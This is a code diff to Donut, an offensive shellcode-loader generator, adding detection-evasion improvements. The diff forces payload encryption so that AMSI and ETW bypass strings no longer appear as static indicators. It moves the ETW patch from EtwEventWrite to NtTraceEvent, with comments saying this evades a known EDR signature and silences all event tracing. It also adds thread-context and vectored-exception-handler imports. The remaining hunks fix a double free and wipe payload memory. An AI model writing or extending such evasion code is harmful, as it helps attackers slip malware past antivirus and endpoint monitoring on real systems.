@@ -113,6 +113,13 @@ static API_IMPORT api_imports[] = {
   {NTDLL_DLL,    "NtCreateSection"},
   {NTDLL_DLL,    "NtMapViewOfSection"},
   {NTDLL_DLL,    "NtUnmapViewOfSection"},
+  {KERNEL32_DLL, "SetThreadContext"},
+  {KERNEL32_DLL, "GetCurrentThreadId"},
+  {KERNEL32_DLL, "GetThreadId"},
+  {KERNEL32_DLL, "SuspendThread"},
+  {KERNEL32_DLL, "ResumeThread"},
+  {NTDLL_DLL,    "RtlAddVectoredExceptionHandler"},
+  {NTDLL_DLL,    "RtlRemoveVectoredExceptionHandler"},
   //{KERNEL32_DLL, "AddVectoredExceptionHandler"},
   //{KERNEL32_DLL, "RemoveVectoredExceptionHandler"},
   //{NTDLL_DLL,    "RtlFreeUnicodeString"},
@@ -815,9 +822,15 @@ cleanup:
 static int build_instance(PDONUT_CONFIG c) {
     DONUT_CRYPT     inst_key, mod_key;
     PDONUT_INSTANCE inst = NULL;
-    int             cnt, inst_len;
+    int             cnt, inst_len, encrypt;
     uint64_t        dll_hash;
     int             err = DONUT_ERROR_OK;
+
+    // Always encrypt when the evasion names are present.  Otherwise -e 1/-e 2
+    // would leave "amsi", "AmsiScanBuffer", "EtwEventWrite", etc. as plaintext
+    // strings in the loader stub, which is a trivial static IOC.
+    encrypt = (c->entropy == DONUT_ENTROPY_DEFAULT) ||
+              (c->bypass != DONUT_BYPASS_NONE);
     
     DPRINT("Entering.");
     
@@ -852,8 +865,9 @@ static int build_instance(PDONUT_CONFIG c) {
     inst->exit_opt = c->exit_opt;
     // set the Original Entry Point
     inst->oep      = c->oep;
-    // set the entropy level
-    inst->entropy  = c->entropy;
+    // The loader decrypts the instance when this flag is DONUT_ENTROPY_DEFAULT.
+    // If we force encryption for a bypass build, the flag must match.
+    inst->entropy  = encrypt ? DONUT_ENTROPY_DEFAULT : c->entropy;
     // set the bypass level
     inst->bypass   = c->bypass;
     // set the headers level
@@ -862,7 +876,7 @@ static int build_instance(PDONUT_CONFIG c) {
     inst->mod_len  = c->mod_len;
 
     // encryption enabled?
-    if(c->entropy == DONUT_ENTROPY_DEFAULT) {
+    if(encrypt) {
       DPRINT("Generating random key for instance");
       if(!gen_random(&inst_key, sizeof(DONUT_CRYPT))) {
         DPRINT("gen_random() failed");
@@ -975,7 +989,11 @@ static int build_instance(PDONUT_CONFIG c) {
       DPRINT("Copying strings required to bypass ETW");
       strcpy(inst->ntdll, "ntdll");
       strcpy(inst->etwEventWrite, "EtwEventWrite");
-      strcpy(inst->etwEventUnregister, "EtwEventUnregister");
+      // Prefer the lower-level syscall stub; patching EtwEventWrite directly is
+      // a well-known EDR signature. NtTraceEvent is the actual transition into
+      // the kernel, so patching it suppresses all ETW writes from the process.
+      strcpy(inst->etwTraceEvent, "NtTraceEvent");
+      strcpy(inst->ntGetNextThread, "NtGetNextThread");
       strcpy(inst->etwRet64, "\xc3");
       strcpy(inst->etwRet32, "\xc2\x14\x00\x00");
     }
@@ -1027,7 +1045,7 @@ static int build_instance(PDONUT_CONFIG c) {
       DPRINT("Loader will attempt to download module from : %s", inst->server);
       
       // encrypt module?
-      if(c->entropy == DONUT_ENTROPY_DEFAULT) {
+      if(encrypt) {
         DPRINT("Encrypting module");
         
         c->mod->mac = maru(inst->sig, inst->iv);
@@ -1046,7 +1064,7 @@ static int build_instance(PDONUT_CONFIG c) {
     }
     
     // encrypt instance?
-    if(c->entropy == DONUT_ENTROPY_DEFAULT) {
+    if(encrypt) {
       DPRINT("Encrypting instance");
       
       inst->mac = maru(inst->sig, inst->iv);
@@ -1063,7 +1081,11 @@ cleanup:
     // error? release memory for everything
     if(err != DONUT_ERROR_OK) {
       DPRINT("Releasing memory for module due to errors.");
+      // c->mod was set by build_module(); DonutCreate() calls DonutDelete()
+      // after an error, so clear the pointer to avoid a double free.
       free(c->mod);
+      c->mod     = NULL;
+      c->mod_len = 0;
     }
     DPRINT("Leaving with error :  %" PRId32, err);
     return err;
@@ -1609,6 +1631,12 @@ int DonutCreate(PDONUT_CONFIG c) {
     return err;
 }
 
+// Zero a buffer without letting the compiler elide the store.
+static void secure_zero(void *ptr, size_t len) {
+    volatile unsigned char *p = (volatile unsigned char*)ptr;
+    while(len--) *p++ = 0;
+}
+
 /**
  * Function: DonutDelete
  * ----------------------------
@@ -1625,24 +1653,32 @@ int DonutDelete(PDONUT_CONFIG c) {
     if(c == NULL) {
       return DONUT_ERROR_INVALID_PARAMETER;
     }
-    // free module
+    // free module (wipe first: it contains the decrypted/encrypted payload)
     if(c->mod != NULL) {
       DPRINT("Releasing memory for module.");
+      secure_zero(c->mod, c->mod_len);
       free(c->mod);
       c->mod = NULL;
     }
-    // free instance
+    // free instance (wipe first: it contains keys and configuration)
     if(c->inst != NULL) {
       DPRINT("Releasing memory for configuration.");
+      secure_zero(c->inst, c->inst_len);
       free(c->inst);
       c->inst = NULL;
     }
-    // free loader
+    // free loader (wipe first: it contains the generated shellcode)
     if(c->pic != NULL) {
       DPRINT("Releasing memory for loader.");
+      secure_zero(c->pic, c->pic_len);
       free(c->pic);
       c->pic = NULL;
     }
+
+    // reset the lengths so a second DonutDelete is harmless and no stale
+    // sizes leak into later builds that reuse this configuration
+    c->mod_len = c->pic_len = c->inst_len = 0;
+
     unmap_file();
     
     DPRINT("Leaving.");
@@ -2143,7 +2179,8 @@ static void usage (void) {
     printf("                   -MODULE OPTIONS-\n\n");
     printf("       -n,--modname: <name>                    Module name for HTTP staging. If entropy is enabled, this is generated randomly.\n");
     printf("       -s,--server: <server>                   Server that will host the Donut module. Credentials may be provided in the following format: https://username:password@192.168.0.1/\n");
-    printf("       -e,--entropy: <level>                   Entropy. 1=None, 2=Use random names, 3=Random names + symmetric encryption (default)\n\n");
+    printf("       -e,--entropy: <level>                   Entropy. 1=None, 2=Use random names, 3=Random names + symmetric encryption (default).\n");
+    printf("                                              Encryption is always enabled when AMSI/WLDP/ETW bypassing is enabled.\n\n");
     
     printf("                   -PIC/SHELLCODE OPTIONS-\n\n");    
     printf("       -a,--arch: <arch>,--cpu: <arch>         Target architecture : 1=x86, 2=amd64, 3=x86+amd64(default).\n");
@@ -2274,7 +2311,10 @@ int main(int argc, char *argv[]) {
     printf("  [ Module file   : \"%s\"\n", c.input);
     printf("  [ Entropy       : %s\n", 
       c.entropy == DONUT_ENTROPY_NONE   ? "None" :
-      c.entropy == DONUT_ENTROPY_RANDOM ? "Random Names" : "Random names + Encryption");      
+      c.entropy == DONUT_ENTROPY_RANDOM ? "Random Names" : "Random names + Encryption");
+    if(c.bypass != DONUT_BYPASS_NONE && c.entropy != DONUT_ENTROPY_DEFAULT) {
+      printf("  [ Encryption    : enabled (required for AMSI/WLDP/ETW bypass)\n");
+    }
     
     if(c.compress != DONUT_COMPRESS_NONE) {
       printf("  [ Compressed    : %s (Reduced by %"PRId32"%%)\n",
